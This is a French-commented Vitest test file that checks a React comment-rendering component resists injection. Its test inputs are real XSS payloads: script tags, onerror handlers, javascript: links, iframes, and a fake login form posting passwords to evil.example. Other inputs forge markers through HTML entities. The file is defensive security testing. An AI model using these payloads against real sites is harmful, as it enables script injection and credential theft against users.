// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { createElement } from "react";
import { act, fireEvent, render } from "@testing-library/react";
import { LocalizationProvider } from "@/contexts/LocalizationProvider";
import { getBaseUrl } from "@/lib/constant/common";
import { COMMENT_PROSE } from "../lib/commentProse";
import { CommentMarkdown, type CommentMarkdownProps } from "./CommentMarkdown";
import type { CommentMention } from "../types";
import "../i18n";

/**
 * Tests d'injection du rendu de message.
 *
 * Le texte d'un commentaire est saisi par n'importe quel visiteur : c'est la surface la moins
 * fiable du module. Chaque cas ci-dessous est une charge réelle, et ce qui est vérifié n'est
 * pas « ça ne plante pas » mais « l'élément dangereux n'est PAS dans le DOM rendu ».
 *
 * Deux barrières doivent tenir indépendamment : le parseur (HTML désactivé, règles retirées)
 * et `sanitizeProse`. Les cas 1 à 7 éprouvent la chaîne complète.
 */

/** Le libellé d'une image tierce est traduit : le composant vit sous le fournisseur de langue. */
function rendre(props: CommentMarkdownProps) {
  return render(createElement(LocalizationProvider, null, createElement(CommentMarkdown, props)));
}

function html(text: string, mentions?: readonly CommentMention[]): HTMLElement {
  return rendre({ text, mentions }).container;
}

/**
 * Les attributs réellement portés par le DOM rendu.
 *
 * On interroge le DOM et non `innerHTML` : du HTML échappé contient littéralement la chaîne
 * `onerror=…` sans qu'aucun élément ne la porte — c'est du texte affiché, inoffensif. Chercher
 * la sous-chaîne condamnerait le comportement le plus sûr.
 */
function attributesInDom(root: HTMLElement): string[] {
  const names: string[] = [];
  for (const el of Array.from(root.querySelectorAll("*"))) {
    for (const attr of Array.from(el.attributes)) names.push(attr.name.toLowerCase());
  }
  return names;
}

describe("CommentMarkdown — injection", () => {
  it("1. un <script> ne survit pas au rendu", () => {
    const el = html('<script>alert("xss")</script>');
    expect(el.querySelector("script")).toBeNull();
    expect(el.innerHTML).not.toContain("<script");
  });

  it("2. un gestionnaire d'événement inline n'est porté par aucun élément", () => {
    const el = html('<img src=x onerror="alert(1)">');
    expect(el.querySelector("img")).toBeNull();
    // La balise est ÉCHAPPÉE : la chaîne « onerror » s'affiche en toutes lettres, mais
    // aucun élément ne la porte comme attribut — c'est là qu'est la sécurité.
    expect(attributesInDom(el).filter(name => name.startsWith("on"))).toHaveLength(0);
    expect(el.textContent).toContain("onerror");
  });

  it("3. un lien markdown en `javascript:` ne devient pas cliquable", () => {
    const el = html("[clique](javascript:alert(1))");
    const href = el.querySelector("a")?.getAttribute("href") ?? "";
    expect(href.toLowerCase()).not.toContain("javascript:");
  });

  it("4. une balise <a> écrite en HTML brut est échappée, pas interprétée", () => {
    const el = html('<a href="javascript:alert(1)">piège</a>');
    expect(el.querySelector("a")).toBeNull();
    // `html: false` échappe la balise : elle s'affiche en toutes lettres.
    expect(el.textContent).toContain("<a href=");
  });

  it("5. le faux écran de connexion n'a aucune de ses pièces", () => {
    // La charge qui a motivé le profil `sanitizeProse` : formulaire plein écran servi depuis
    // le domaine de confiance, sans le moindre script.
    const el = html('<div style="position:fixed;inset:0"><form action="https://evil.example">'
      + '<input type="password" name="p"><button>Se connecter</button></form></div>');
    expect(el.querySelector("form")).toBeNull();
    expect(el.querySelector("input")).toBeNull();
    expect(el.querySelector("button")).toBeNull();
    // Aucun élément positionné : le `style` n'existe que dans le texte échappé, où il ne
    // s'applique à rien. Sans conteneur positionné, pas de calque plein écran.
    expect(attributesInDom(el)).not.toContain("style");
  });

  it("6. une <iframe> ne survit pas", () => {
    const el = html('<iframe src="https://evil.example"></iframe>');
    expect(el.querySelector("iframe")).toBeNull();
  });

  it("7. un titre à croisillons s'affiche, sur six niveaux — ce qu'écrit l'éditeur du legacy", () => {
    const el = html("# Un\n## Deux\n### Trois\n#### Quatre\n##### Cinq\n###### Six\nla suite");
    expect([...el.querySelectorAll("h1, h2, h3, h4, h5, h6")].map(h => `${h.tagName} ${h.textContent}`))
      .toEqual(["H1 Un", "H2 Deux", "H3 Trois", "H4 Quatre", "H5 Cinq", "H6 Six"]);
    expect(el.querySelector("p")?.textContent).toBe("la suite");
  });

  it("7 bis. sept croisillons, un croisillon collé à son mot : du texte, pas un titre", () => {
    const el = html("####### sept\n\n#motdièse et #2");
    expect(el.querySelector("h1, h2, h3, h4, h5, h6")).toBeNull();
    expect(el.textContent).toContain("####### sept");
    expect(el.textContent).toContain("#motdièse et #2");
  });

  it("7 ter. un titre n'ouvre aucune porte : le HTML écrit dedans reste du texte", () => {
    const el = html('# <img src=x onerror="alert(1)"> titre');
    expect(el.querySelector("h1")?.textContent).toBe('<img src=x onerror="alert(1)"> titre');
    expect(el.querySelector("img")).toBeNull();
  });

  it("7 quater. un titre SOULIGNÉ, lui, n'existe pas : la règle reste coupée", () => {
    // « Titre » suivi d'une ligne de `=` ou de `-` est un titre en markdown, sans un seul croisillon.
    const el = html("Titre géant\n===\n\nSous-titre\n---");
    expect(el.querySelector("h1, h2, h3, h4, h5, h6")).toBeNull();
    expect(el.textContent).toContain("Titre géant");
  });

  it("8. une image distante n'est pas chargée : un bouton l'attend", () => {
    // Une image distante ferait connaître l'adresse IP de chaque lecteur au serveur tiers : elle
    // attend un clic (décision de l'user, 14/10/2026).
    const el = html("![pixel](https://evil.example/track.png)");
    expect(el.querySelector("img")).toBeNull();
    expect(el.querySelector("button[data-remote-image]")?.textContent).toContain("evil.example");
  });

  it("9. un attribut `data-*` est retiré — les sélecteurs de la page les lisent", () => {
    const el = html('<span data-state="open">x</span>');
    expect(el.querySelector("[data-state]")).toBeNull();
  });
});

describe("CommentMarkdown — rendu", () => {
  it("interprète le markdown courant", () => {
    const el = html("**gras** et *italique* et `code`");
    expect(el.querySelector("strong")?.textContent).toBe("gras");
    expect(el.querySelector("em")?.textContent).toBe("italique");
    expect(el.querySelector("code")?.textContent).toBe("code");
  });

  it("respecte les retours à la ligne simples, comme dans une discussion", () => {
    const el = html("première ligne\nseconde ligne");
    expect(el.querySelector("br")).toBeTruthy();
  });

  it("marque les liens sortants `nofollow ugc` — l'arme contre le spam de liens", () => {
    const el = html("https://exemple.test/page");
    const a = el.querySelector("a");
    expect(a?.getAttribute("rel")).toBe("noopener noreferrer nofollow ugc");
    // MESURÉ : `sanitizeProse` retire `target`, donc le composant ne le pose pas — le poser
    // donnerait l'illusion d'un comportement que la sanitisation défait juste après.
    expect(a?.getAttribute("target")).toBeNull();
  });

  it("ne marque pas les liens internes produits par une mention", () => {
    const el = html("@marie", [{ id: "1", name: "Marie", slug: "marie" }]);
    const a = el.querySelector('a[href="/profil/marie"]');
    expect(a).toBeTruthy();
    expect(a?.getAttribute("rel")).toBeNull();
    expect(a?.textContent).toBe("@Marie");
  });

  it("affiche une citation et une liste", () => {
    const el = html("> citation\n\n- un\n- deux");
    expect(el.querySelector("blockquote")).toBeTruthy();
    expect(el.querySelectorAll("li")).toHaveLength(2);
  });

  // L'éditeur du composer porte les MÊMES classes : ce qu'on voit en tapant est ce qu'on lira ici.
  it("porte la mise en forme partagée avec l'éditeur, en plus de celle qu'on lui donne", () => {
    const { container } = rendre({ text: "x", className: "à-moi" });
    const boite = container.firstElementChild!;
    for (const classe of COMMENT_PROSE.split(" ")) expect(boite.classList.contains(classe)).toBe(true);
    expect(boite.classList.contains("à-moi")).toBe(true);
  });
});

describe("CommentMarkdown — le @moi", () => {
  const ME = "a".repeat(24);
  const MENTIONS: readonly CommentMention[] = [
    { id: ME, name: "Raya", slug: "raya" },
    { id: "b".repeat(24), name: "Simon", slug: "simon" },
  ];
  const rendreMoi = (text: string, meId: string | null) => rendre({ text, mentions: MENTIONS, meId }).container;

  it("marque MA mention, pas celle d'autrui — la marque survit à l'assainissement", () => {
    const el = rendreMoi("@raya et @simon", ME);
    expect(el.querySelector('a[href="/profil/raya"]')?.hasAttribute("data-mention-me")).toBe(true);
    expect(el.querySelector('a[href="/profil/simon"]')?.hasAttribute("data-mention-me")).toBe(false);
  });

  it("ne marque rien sans utilisateur connu", () => {
    expect(rendreMoi("@raya", null).querySelector("[data-mention-me]")).toBeNull();
  });

  it("un auteur ne peut pas forger la marque : son HTML est échappé", () => {
    const el = rendreMoi('<a href="/profil/simon" data-mention-me>faux</a>', ME);
    expect(el.querySelector("[data-mention-me]")).toBeNull();
  });
});

/**
 * Les images DANS le texte (décision de l'user, 14/10/2026) : importée sur la plateforme, l'image
 * s'affiche ; d'un autre site, elle attend un clic du lecteur — jusque-là, rien n'est demandé à ce
 * site. Jamais d'image pour une adresse qui n'est pas une image en ligne.
 */
describe("CommentMarkdown — images dans le texte", () => {
  const plateforme = (chemin: string) => new URL(chemin, getBaseUrl()).href;
  const boutons = (el: HTMLElement) => el.querySelectorAll<HTMLButtonElement>("button[data-remote-image]");

  it("un fichier importé (chemin relatif `/upload/…`) s'affiche, lu contre le serveur", () => {
    const el = html("Voici ![un chat](/upload/communecter/comments/abc/chat.png) !");
    const img = el.querySelector("img");
    expect(img?.getAttribute("src")).toBe(plateforme("/upload/communecter/comments/abc/chat.png"));
    expect(img?.getAttribute("alt")).toBe("un chat");
    expect(img?.getAttribute("loading")).toBe("lazy");
    expect(boutons(el)).toHaveLength(0);
  });

  it("une adresse complète du serveur aussi", () => {
    const adresse = plateforme("/upload/x.png");
    expect(html(`![x](${adresse})`).querySelector("img")?.getAttribute("src")).toBe(adresse);
  });

  it("une image d'un autre site : un bouton qui nomme le site, l'adresse en infobulle — et rien de chargé", () => {
    const el = html("![un chat](https://images.example.org/chat.jpg)");
    expect(el.querySelector("img")).toBeNull();
    const [bouton] = boutons(el);
    expect(bouton?.textContent).toContain("images.example.org");
    expect(bouton?.getAttribute("title")).toBe("https://images.example.org/chat.jpg");
    expect(bouton?.getAttribute("type")).toBe("button");
  });

  it("au clic, l'image s'affiche — sans Referer — et le focus la suit", () => {
    const el = html("![un chat](https://images.example.org/chat.jpg)");
    const [bouton] = boutons(el);
    act(() => { bouton!.focus(); fireEvent.click(bouton!); });
    const img = el.querySelector("img");
    expect(img?.getAttribute("src")).toBe("https://images.example.org/chat.jpg");
    expect(img?.getAttribute("alt")).toBe("un chat");
    expect(img?.getAttribute("referrerpolicy")).toBe("no-referrer");
    expect(boutons(el)).toHaveLength(0);
    expect(document.activeElement).toBe(img);
  });

  it("chaque bouton n'ouvre que SON image", () => {
    const el = html("![a](https://a.example/1.png) et ![b](https://b.example/2.png)");
    act(() => { fireEvent.click(boutons(el)[1]!); });
    expect(el.querySelector("img")?.getAttribute("src")).toBe("https://b.example/2.png");
    expect(boutons(el)).toHaveLength(1);
    expect(boutons(el)[0]?.textContent).toContain("a.example");
  });

  it("ouvrir une seconde image garde la première ouverte", () => {
    const el = html("![a](https://a.example/1.png) et ![b](https://b.example/2.png)");
    act(() => { fireEvent.click(boutons(el)[0]!); });
    act(() => { fireEvent.click(boutons(el)[0]!); });
    expect([...el.querySelectorAll("img")].map(img => img.getAttribute("src"))).toEqual(["https://a.example/1.png", "https://b.example/2.png"]);
  });

  it("un autre rendu au même texte ne réécrit PAS le message — le lien pressé reste le même élément", () => {
    // React 19 compare `dangerouslySetInnerHTML` par identité : un objet neuf réécrivait le
    // message, et le premier clic sur un lien ou un bouton se perdait (mesuré au navigateur).
    const props = { text: "Voir [le lien](https://exemple.org/page) et ![a](https://a.example/1.png)" };
    const vue = rendre({ ...props, mentions: [] });
    const lien = vue.container.querySelector("a");
    const bouton = vue.container.querySelector("button[data-remote-image]");
    vue.rerender(createElement(LocalizationProvider, null, createElement(CommentMarkdown, { ...props, mentions: [] })));
    expect(vue.container.querySelector("a")).toBe(lien);
    expect(vue.container.querySelector("button[data-remote-image]")).toBe(bouton);
  });

  it("un autre texte — le message édité — referme les images ouvertes", () => {
    const vue = rendre({ text: "![a](https://a.example/1.png)" });
    act(() => { fireEvent.click(boutons(vue.container)[0]!); });
    expect(vue.container.querySelector("img")).not.toBeNull();
    vue.rerender(createElement(LocalizationProvider, null, createElement(CommentMarkdown, { text: "![a](https://a.example/1.png) modifié" })));
    expect(vue.container.querySelector("img")).toBeNull();
    expect(boutons(vue.container)).toHaveLength(1);
  });

  it("prise dans un lien : ni bouton ni image — sa description, et le lien", () => {
    const el = html("[![le site](https://images.example.org/logo.png)](https://site.example)");
    expect(boutons(el)).toHaveLength(0);
    expect(el.querySelector("img")).toBeNull();
    expect(el.querySelector('a[href="https://site.example"]')?.textContent).toBe("le site");
  });

  it("refusées : `data:` et `javascript:` ne donnent jamais d'image ni de bouton", () => {
    const donnees = html("![pixel](data:image/png;base64,iVBORw0KGgo=)");
    expect(donnees.querySelector("img")).toBeNull();
    expect(boutons(donnees)).toHaveLength(0);
    expect(donnees.textContent).toContain("pixel");
    const script = html("![x](javascript:alert(1))");
    expect(script.querySelector("img, button, a")).toBeNull();
  });

  it("personne ne peut forger une marque : ses signes sont retirés du texte", () => {
    const el = html("\uE0000\uE001 puis ![a](https://a.example/1.png)");
    expect(boutons(el)).toHaveLength(1);
  });

  /**
   * `markdown-it` DÉCODE les entités numériques même sans HTML : `&#xE000;` devient le premier signe
   * d'une marque — dans le texte, dans le titre d'un lien, dans la description d'une image. Une
   * marque ainsi écrite, au milieu d'un attribut, recevrait le balisage posé APRÈS le nettoyage :
   * le jeton du rendu la rend inopérante.
   */
  it.each([
    ["le titre d'un lien", '![x](https://evil.example/a.png) [l](https://ok.example "A&#xE000;0&#xE001;B")'],
    ["la description d'une image importée", "![x](https://evil.example/a.png) ![A&#xE000;0&#xE001;B](/upload/x.png)"],
    ["le texte, en décimal", "![x](https://evil.example/a.png) avant &#57344;0&#57345; après"],
  ])("une marque fabriquée par entité dans %s ne reçoit aucun balisage", (_ou, texte) => {
    const el = html(texte);
    expect(boutons(el)).toHaveLength(1);
    for (const element of Array.from(el.querySelectorAll("*"))) {
      for (const attribut of Array.from(element.attributes)) expect(attribut.value).not.toMatch(/<|data-remote-image=|\uE000|\uE001/);
    }
    expect(el.textContent).not.toMatch(/[\uE000\uE001]/);
  });

  it("sans image tierce, les signes d'une marque fabriquée partent aussi", () => {
    const el = html("avant &#xE000;0&#xE001; après, et ![a](/upload/a.png)");
    expect(el.textContent).not.toMatch(/[\uE000\uE001]/);
    expect(el.querySelector("img")?.getAttribute("alt")).toBe("a");
  });

  it("une description piégée reste du texte, fermée comme ouverte", () => {
    const el = html('![" onerror="alert(1)](https://x.example/a.png)');
    expect(attributesInDom(el)).not.toContain("onerror");
    act(() => { fireEvent.click(boutons(el)[0]!); });
    expect(attributesInDom(el)).not.toContain("onerror");
    expect(el.querySelector("img")?.getAttribute("alt")).toBe('" onerror="alert(1)');
  });

  it("un signe échappé reste dans la description — même d'une image glissée dans une description", () => {
    expect(html("![a \\] b](/upload/a.png)").querySelector("img")?.getAttribute("alt")).toBe("a ] b");
    expect(html("![a ![b \\] c](https://x.example/i.png)](/upload/o.png)").querySelector("img")?.getAttribute("alt")).toBe("a b ] c");
  });

  it("une image importée, prise dans un lien, reste une image", () => {
    const el = html("[![logo](/upload/logo.png)](https://site.example)");
    expect(el.querySelector('a[href="https://site.example"] img')?.getAttribute("src")).toBe(plateforme("/upload/logo.png"));
  });
});
